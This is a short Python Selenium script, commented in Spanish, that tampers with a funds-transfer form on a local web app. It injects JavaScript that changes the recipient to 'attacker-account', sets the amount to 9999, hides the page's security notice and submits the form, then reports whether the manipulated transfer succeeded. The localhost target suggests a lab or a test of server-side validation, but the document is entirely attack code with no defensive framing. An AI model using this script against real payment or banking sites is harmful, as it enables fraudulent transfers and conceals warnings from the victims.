from selenium import webdriver
import time

# Configuración
driver = webdriver.Chrome()
target_url = "http://localhost:3000/transfer"

try:
    driver.get(target_url)
    time.sleep(2)
    
    # Modificar campos del formulario
    malicious_js = """
    // Cambiar destinatario
    document.getElementById('recipient').value = 'attacker-account';
    
    // Modificar monto
    document.getElementById('amount').value = '9999';
    
    // Ocultar elementos de seguridad
    document.getElementById('security-notice').style.display = 'none';
    """
    
    driver.execute_script(malicious_js)
    print("DOM manipulado")
    
    # Enviar formulario modificado
    driver.execute_script("document.getElementById('transfer-form').submit();")
    time.sleep(3)
    
    # Verificar resultado
    if "success" in driver.page_source:
        print("¡Transferencia manipulada exitosamente!")
    
finally:
    driver.quit()